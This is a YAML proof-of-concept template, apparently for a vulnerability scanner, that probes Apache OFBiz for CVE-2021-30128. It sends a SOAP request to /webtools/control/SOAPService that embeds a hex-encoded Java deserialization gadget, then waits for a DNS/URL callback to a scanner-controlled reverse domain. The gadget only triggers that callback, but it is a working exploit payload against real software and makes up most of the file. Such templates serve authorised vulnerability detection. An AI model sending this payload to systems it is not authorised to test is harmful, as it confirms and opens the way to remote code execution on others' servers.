name: yaml-poc-apache-ofbiz-logical-CVE-2021-30128
binding: 809cebea-c995-4708-af9a-6ef7c17fc322
detail:
    author: jiapeng.han
    links:
        - http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-30128
        - http://www.openwall.com/lists/oss-security/2021/04/27/5
        - https://help.aliyun.com/noticelist/articleid/1060840016.html
        - https://lists.apache.org/thread.html/r078351a876ed284ba667b33aba29428d7308a5bd4df78f14a3df6661%40%3Cnotifications.ofbiz.apache.org%3E
        - https://lists.apache.org/thread.html/r078351a876ed284ba667b33aba29428d7308a5bd4df78f14a3df6661@%3Cnotifications.ofbiz.apache.org%3E
        - https://lists.apache.org/thread.html/r108a964764b8bd21ebd32ccd4f51c183ee80a251c105b849154a8e9d%40%3Ccommits.ofbiz.apache.org%3E
        - https://lists.apache.org/thread.html/r108a964764b8bd21ebd32ccd4f51c183ee80a251c105b849154a8e9d@%3Ccommits.ofbiz.apache.org%3E
        - https://lists.apache.org/thread.html/rab718cfe6468085d7560c0c1ae816841e175886199f42e36efb8d735%40%3Cnotifications.ofbiz.apache.org%3E
        - https://lists.apache.org/thread.html/rab718cfe6468085d7560c0c1ae816841e175886199f42e36efb8d735@%3Cnotifications.ofbiz.apache.org%3E
        - https://lists.apache.org/thread.html/rb3f5cd65f3ddce9b9eb4d6ea6e2919933f0f89b15953769d11003743%40%3Cannounce.apache.org%3E
        - https://lists.apache.org/thread.html/rb3f5cd65f3ddce9b9eb4d6ea6e2919933f0f89b15953769d11003743%40%3Cdev.ofbiz.apache.org%3E
        - https://lists.apache.org/thread.html/rb3f5cd65f3ddce9b9eb4d6ea6e2919933f0f89b15953769d11003743%40%3Cuser.ofbiz.apache.org%3E
        - https://lists.apache.org/thread.html/rb3f5cd65f3ddce9b9eb4d6ea6e2919933f0f89b15953769d11003743@%3Cannounce.apache.org%3E
        - https://lists.apache.org/thread.html/rb3f5cd65f3ddce9b9eb4d6ea6e2919933f0f89b15953769d11003743@%3Cdev.ofbiz.apache.org%3E
        - https://lists.apache.org/thread.html/rb3f5cd65f3ddce9b9eb4d6ea6e2919933f0f89b15953769d11003743@%3Cuser.ofbiz.apache.org%3E
        - https://lists.apache.org/thread.html/rb82f41de3c44bb644632531f79649046ca76afeab25a2bdb9991ab84%40%3Cnotifications.ofbiz.apache.org%3E
        - https://lists.apache.org/thread.html/rb82f41de3c44bb644632531f79649046ca76afeab25a2bdb9991ab84@%3Cnotifications.ofbiz.apache.org%3E
        - https://lists.apache.org/thread.html/rbe512e5ccd6b11169c6379daa1234bc805f3d53c5a38224e956295ce%40%3Cnotifications.ofbiz.apache.org%3E
        - https://lists.apache.org/thread.html/rbe512e5ccd6b11169c6379daa1234bc805f3d53c5a38224e956295ce@%3Cnotifications.ofbiz.apache.org%3E
        - https://lists.apache.org/thread.html/rbe8439b26a71fc3b429aa793c65dcc4a6e349bc7bb5010746a74fa1d%40%3Ccommits.ofbiz.apache.org%3E
        - https://lists.apache.org/thread.html/rbe8439b26a71fc3b429aa793c65dcc4a6e349bc7bb5010746a74fa1d@%3Ccommits.ofbiz.apache.org%3E
        - https://nvd.nist.gov/vuln/detail/CVE-2021-30128
        - https://www.cybersecurity-help.cz/vdb/SB2021042814
    vulnerability:
        id: 6e0a2cda-ceb5-457d-8533-89f084a76325
        level: critical
    warning: Harmless
transport: http
set:
    reverse: newReverse()
    reverseDomain: |
        "https://" + reverse.domain
    hee: hex(javaGadget("dns", reverseDomain, "url"))
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /webtools/control/SOAPService
            headers:
                Content-Type: text/xml
            body: |-
                <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://ofbiz.apache.org/service/">
                          <soapenv:Header/>
                            <soapenv:Body>
                              <ser>
                                <map-Map>
                                  <map-Entry>
                                    <map-Key>
                                      <cus-obj>{{hee}}</cus-obj>
                                    </map-Key>
                                  <map-Value>
                                <std-String/>
                                </map-Value>
                                </map-Entry>
                              </map-Map>
                              </ser>
                            </soapenv:Body>
                        </soapenv:Envelope>
            follow_redirects: false
        expression: reverse.wait(5)
expression: r0()
